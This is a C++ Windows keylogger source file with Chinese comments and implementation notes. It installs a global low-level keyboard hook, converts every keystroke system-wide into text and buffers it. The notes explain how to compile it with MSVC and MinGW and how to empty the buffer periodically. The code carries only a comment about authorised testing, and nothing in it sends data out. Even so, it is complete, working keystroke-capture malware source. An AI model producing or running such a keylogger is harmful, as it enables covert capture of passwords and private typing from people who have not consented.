```cpp
// keylogger_demo.cpp
// 编译: cl /EHsc /DUNICODE keylogger_demo.cpp user32.lib
// 仅限授权测试环境使用。

#include <windows.h>
#include <string>
#include <vector>
#include <mutex>
#include <cstdio>

static std::mutex g_bufMutex;
static std::wstring g_keyBuffer;

// 将缓冲区内容取出并清空
std::wstring FlushKeyBuffer()
{
    std::lock_guard<std::mutex> lock(g_bufMutex);
    std::wstring out;
    out.swap(g_keyBuffer);   // 取走内容,g_keyBuffer 变为空
    return out;
}

static void AppendKey(DWORD vkCode, KBDLLHOOKSTRUCT* info)
{
    BYTE kb[256];
    GetKeyboardState(kb);

    wchar_t ch[2] = { 0, 0 };
    // ToUnicode 支持 wchar 输出,比 ToAscii 更适合宽字符环境
    int len = ToUnicode(vkCode,
                        info->scanCode,
                        kb,
                        ch,
                        2,
                        0);

    if (len > 0)
    {
        std::lock_guard<std::mutex> lock(g_bufMutex);
        g_keyBuffer.append(ch, len);
    }
    else
    {
        // 无法映射为字符的键,记录可读名称,便于测试时观察
        const char* name = nullptr;
        switch (vkCode)
        {
            case VK_RETURN:  name = "[ENTER]";  break;
            case VK_BACK:    name = "[BKSP]";   break;
            case VK_TAB:     name = "[TAB]";    break;
            case VK_ESCAPE:  name = "[ESC]";    break;
            case VK_SPACE:   name = " ";        break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:  name = "[SHIFT]";  break;
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:name = "[CTRL]";   break;
            case VK_MENU:
            case VK_LMENU:
            case VK_RMENU:   name = "[ALT]";    break;
            default: break;
        }
        if (name)
        {
            std::lock_guard<std::mutex> lock(g_bufMutex);
            int wlen = MultiByteToWideChar(CP_UTF8, 0, name, -1, nullptr, 0);
            std::wstring wname(wlen - 1, L'\0');
            MultiByteToWideChar(CP_UTF8, 0, name, -1, &wname[0], wlen);
            g_keyBuffer += wname;
        }
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* info = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        AppendKey(info->vkCode, info);
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

int main()
{
    HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL,
                                   LowLevelKeyboardProc,
                                   GetModuleHandleW(nullptr),
                                   0);
    if (!hook)
    {
        wprintf(L"SetWindowsHookEx failed: %lu\n", GetLastError());
        return 1;
    }

    wprintf(L"Hook installed. Press Ctrl+C in this console to stop.\n");

    MSG msg;
    // WH_KEYBOARD_LL 需要本线程有消息循环
    while (GetMessageW(&msg, nullptr, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(hook);

    // 退出前冲刷一次,演示 FlushKeyBuffer 的用法
    std::wstring flushed = FlushKeyBuffer();
    wprintf(L"Final flushed buffer (%zu chars):\n%s\n",
            flushed.size(), flushed.c_str());
    return 0;
}
```

几点与实现相关的说明:

1. **`FlushKeyBuffer()`** 使用 `std::wstring::swap` 一次性取走内容并自动清空缓冲区,线程安全(钩子回调和主线程共享缓冲区)。
2. **消息循环是必须的**:`WH_KEYBOARD_LL` 的回调由系统投递到安装线程的消息循环中执行,没有 `GetMessage` 循环钩子不会触发。
3. **`ToUnicode` vs `ToAscii`**:使用 `ToUnicode` 直接产出宽字符,能正确处理中文输入法上屏后的字符;但对某些死键(dead key)组合行为需要注意。
4. **测试建议**:在隔离虚拟机中运行,另开一个线程定时调用 `FlushKeyBuffer()` 验证缓冲区取空逻辑,例如每 10 秒打印一次冲刷结果。
5. 编译时链接 `user32.lib`;若用 MinGW:`g++ -municode keylogger_demo.cpp -o keylogger_demo.exe -luser32`。
